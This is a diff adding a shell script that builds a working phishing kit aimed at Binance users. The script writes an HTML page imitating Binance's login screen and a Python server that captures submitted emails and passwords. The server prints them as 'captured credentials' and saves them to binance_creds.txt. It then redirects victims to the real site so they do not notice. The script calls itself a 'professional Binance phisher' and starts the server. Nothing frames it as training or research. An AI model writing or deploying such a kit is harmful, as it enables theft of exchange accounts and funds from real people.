@@ -1,0 +1,246 @@
+cd ~
+rm -rf binance_phish && mkdir binance_phish && cd binance_phish
+
+cat > index.html << 'EOF'
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Binance | Cryptocurrency Exchange</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body { 
+            font-family: 'Arial', sans-serif; 
+            background: #0f0f0f; 
+            color: #eaeaea;
+            min-height: 100vh;
+        }
+        .container {
+            display: flex;
+            min-height: 100vh;
+        }
+        .left-section {
+            flex: 1;
+            background: linear-gradient(135deg, #1e1e1e 0%, #2d2d2d 100%);
+            padding: 40px;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+        }
+        .logo {
+            font-size: 32px;
+            font-weight: bold;
+            color: #f0b90b;
+            margin-bottom: 60px;
+        }
+        .slogan {
+            font-size: 42px;
+            font-weight: bold;
+            line-height: 1.2;
+            margin-bottom: 20px;
+        }
+        .features {
+            list-style: none;
+            margin-top: 40px;
+        }
+        .features li {
+            margin-bottom: 15px;
+            font-size: 16px;
+            color: #888;
+        }
+        
+        .right-section {
+            width: 400px;
+            background: #1e1e1e;
+            padding: 40px 30px;
+            border-left: 1px solid #333;
+        }
+        .login-box {
+            background: #2d2d2d;
+            padding: 30px;
+            border-radius: 8px;
+            border: 1px solid #444;
+        }
+        .login-title {
+            font-size: 24px;
+            font-weight: bold;
+            margin-bottom: 10px;
+            color: #f0b90b;
+        }
+        .login-subtitle {
+            color: #888;
+            margin-bottom: 30px;
+            font-size: 14px;
+        }
+        .input-group {
+            margin-bottom: 20px;
+        }
+        .input-group input {
+            width: 100%;
+            padding: 15px;
+            background: #3d3d3d;
+            border: 1px solid #555;
+            border-radius: 5px;
+            color: white;
+            font-size: 14px;
+        }
+        .input-group input:focus {
+            outline: none;
+            border-color: #f0b90b;
+        }
+        .login-btn {
+            width: 100%;
+            padding: 15px;
+            background: #f0b90b;
+            color: black;
+            border: none;
+            border-radius: 5px;
+            font-size: 16px;
+            font-weight: bold;
+            cursor: pointer;
+            margin-top: 10px;
+        }
+        .login-btn:hover {
+            background: #d8a500;
+        }
+        .divider {
+            text-align: center;
+            margin: 20px 0;
+            color: #666;
+            font-size: 12px;
+        }
+        .signup-btn {
+            width: 100%;
+            padding: 15px;
+            background: transparent;
+            color: #f0b90b;
+            border: 1px solid #f0b90b;
+            border-radius: 5px;
+            font-size: 16px;
+            font-weight: bold;
+            cursor: pointer;
+        }
+        .footer {
+            text-align: center;
+            margin-top: 30px;
+            color: #666;
+            font-size: 12px;
+        }
+        .security-badge {
+            background: #2d2d2d;
+            padding: 10px;
+            border-radius: 5px;
+            text-align: center;
+            margin-bottom: 20px;
+            border: 1px solid #444;
+            color: #f0b90b;
+            font-size: 12px;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="left-section">
+            <div class="logo">Binance</div>
+            <div class="slogan">Trade Bitcoin,<br>Ethereum & 300+<br>Cryptocurrencies</div>
+            <ul class="features">
+                <li>✓ Trade 300+ cryptocurrencies</li>
+                <li>✓ Lowest fees in the industry</li>
+                <li>✓ 24/7 customer support</li>
+                <li>✓ Advanced trading tools</li>
+            </ul>
+        </div>
+        
+        <div class="right-section">
+            <div class="security-badge">
+                🔒 Secure Login Required
+            </div>
+            <div class="login-box">
+                <div class="login-title">Log In</div>
+                <div class="login-subtitle">Welcome back to Binance</div>
+                <form method="POST" action="/login">
+                    <div class="input-group">
+                        <input type="email" name="email" placeholder="Email Address" required>
+                    </div>
+                    <div class="input-group">
+                        <input type="password" name="password" placeholder="Password" required>
+                    </div>
+                    <button type="submit" class="login-btn">Log In</button>
+                </form>
+                <div class="divider">or</div>
+                <button class="signup-btn">Sign Up Now</button>
+                <div class="footer">
+                    <a href="#" style="color: #f0b90b;">Forgot Password?</a><br><br>
+                    Binance © 2024
+                </div>
+            </div>
+        </div>
+    </div>
+</body>
+</html>
+EOF
+
+cat > server.py << 'EOF'
+import http.server
+import socketserver
+import urllib.parse
+from datetime import datetime
+
+PORT = 8081
+
+print("🚀 BINANCE SECURITY PORTAL STARTED!")
+print("=" * 50)
+print("🌐 YOUR BINANCE LOGIN LINK: http://localhost:8081")
+print("=" * 50)
+print("🔐 Monitoring for login attempts...")
+print("⏹️  Press CTRL+C to stop")
+print("=" * 50)
+
+class PhishHandler(http.server.SimpleHTTPRequestHandler):
+    def do_GET(self):
+        if self.path == '/':
+            self.send_response(200)
+            self.send_header('Content-type', 'text/html')
+            self.end_headers()
+            with open('index.html', 'rb') as f:
+                self.wfile.write(f.read())
+        else:
+            self.send_error(404)
+    
+    def do_POST(self):
+        if self.path == '/login':
+            content_length = int(self.headers['Content-Length'])
+            post_data = self.rfile.read(content_length).decode()
+            data = urllib.parse.parse_qs(post_data)
+            
+            email = data.get('email', [''])[0]
+            password = data.get('password', [''])[0]
+            
+            if email and password:
+                timestamp = datetime.now().strftime("%H:%M:%S")
+                print(f"🎯 CAPTURED BINANCE CREDENTIALS:")
+                print(f"📧 Email: {email}")
+                print(f"🔑 Password: {password}") 
+                print(f"⏰ Time: {timestamp}")
+                print("─" * 50)
+                
+                with open("binance_creds.txt", "a") as f:
+                    f.write(f"[{timestamp}] Email: {email} | Password: {password}\n")
+            
+            self.send_response(200)
+            self.send_header('Content-type', 'text/html')
+            self.end_headers()
+            self.wfile.write(b'<html><body style="background: #0f0f0f; color: #eaeaea; text-align: center; padding: 100px; font-family: Arial;"><h2 style="color: #f0b90b;">Login Successful!</h2><p>Redirecting to your wallet...</p><script>setTimeout(() => window.location="https://www.binance.com", 2000)</script></body></html>')
+
+with socketserver.TCPServer(("", PORT), PhishHandler) as httpd:
+    try:
+        httpd.serve_forever()
+    except KeyboardInterrupt:
+        print("\n🛑 Binance portal stopped")
+EOF
+
+echo "✅ Professional Binance phisher created!"
+echo "🌐 Starting server on PORT 8081..."
+echo "📧 Use: http://localhost:8081"
+python3 server.py
